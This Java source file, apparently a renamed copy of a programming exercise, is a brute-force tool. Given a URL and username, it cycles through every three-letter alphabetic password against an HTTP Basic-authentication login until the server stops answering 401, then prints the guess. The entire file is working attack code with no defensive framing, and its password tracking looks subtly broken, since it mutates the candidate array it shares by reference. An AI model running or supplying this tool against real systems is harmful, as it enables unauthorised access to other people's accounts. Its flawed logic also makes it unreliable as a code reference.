import java.net.*;
import java.io.*;
public class BruteForce extends Authenticator {
    private String f00;
    private URL f10;
    private char [] f20;
    private char [] f30;
    public static void main ( String [] v0 ) {
        if ( v0.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        BruteForce v1;
        v1 = null;
        try {
            v1 = new BruteForce ( v0[0], v0[1] );
        } catch ( MalformedURLException v2 ) {
            v2.printStackTrace();
            System.exit ( 1 );
        }
        v1.m00();
        System.exit ( 0 );
    }
    public BruteForce ( String v3, String v4 )
    throws MalformedURLException {
        this.f10 = new URL ( v3 );
        this.f00 = v4;
        this.f20 = new char [] {'a'};
    }
    public void m00() {
        Authenticator.setDefault ( this );
        HttpURLConnection v5;
        v5 = null;
        try {
            v5 = ( HttpURLConnection ) f10.openConnection();
            v5.connect();
            for ( ; v5.getResponseCode() == HttpURLConnection.HTTP_UNAUTHORIZED
                    && f20 != null; ) {
                try {
                    InputStream v6;
                    v6 = v5.getInputStream();
                    v5.connect();
                } catch ( ProtocolException v7 ) {
                    v5 = ( HttpURLConnection ) f10.openConnection();
                } catch ( NullPointerException v8 ) {
                    v8.printStackTrace();
                    System.exit ( 1 );
                }
            }
        } catch ( java.io.IOException v9 ) {
            v9.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( "password=" + new String ( f30 ) );
    }
    public PasswordAuthentication getPasswordAuthentication() {
        m20();
        return new PasswordAuthentication ( f00, f30 );
    }
    public void m20() {
        int v10;
        if ( f30 == null ) {
            f30 = new char [] {'A', 'A', 'A'};
            f20 = new char [] {'A', 'A', 'B'};
            return;
        }
        f30 = f20;
        if ( f20[2] == 'Z' ) {
            f20[2] = 'a';
            return;
        } else if ( f20[2] != 'z' ) {
            v10 = ( int ) f20[2];
            v10 = v10 + 1;
            f20[2] = ( char ) + v10;
        } else {
            f20[2] = 'A';
            if ( f20[1] == 'Z' ) {
                f20[1] = 'a';
            } else if ( f20[1] != 'z' ) {
                v10 = ( int ) f20[1];
                v10 = v10 + 1;
                f20[1] = ( char ) + v10;
            } else {
                f20[1] = 'A';
                if ( f20[0] == 'Z' ) {
                    f20[0] = 'a';
                } else if ( f20[0] != 'z' ) {
                    v10 = ( int ) f20[0];
                    v10 = v10 + 1;
                    f20[0] = ( char ) + v10;
                } else {
                    f20 = null;
                }
            }
        }
    }
}
